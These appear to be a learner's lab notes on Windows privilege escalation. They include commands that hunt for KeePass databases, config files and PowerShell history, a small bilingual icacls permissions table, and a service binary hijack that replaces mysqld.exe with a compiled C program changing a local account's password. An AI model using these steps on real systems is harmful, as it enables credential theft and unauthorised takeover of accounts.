```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

runas /user:backupadmin cmd

runas /user:richmond cmd

C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}


```

|MASK|PERMISSIONS|
|---|---|
|F|Full access 完全访问权限|
|M|Modify access 修改访问权限|
|RX|Read and execute access  <br>读取和执行访问权限|
|R|Read-only access 只读访问|
|W|Write-only access 只写访问|

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user daveadmin password123!");
  
  return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

whoami /priv

shutdown /r /t 0

Get-LocalGroupMember administrators


```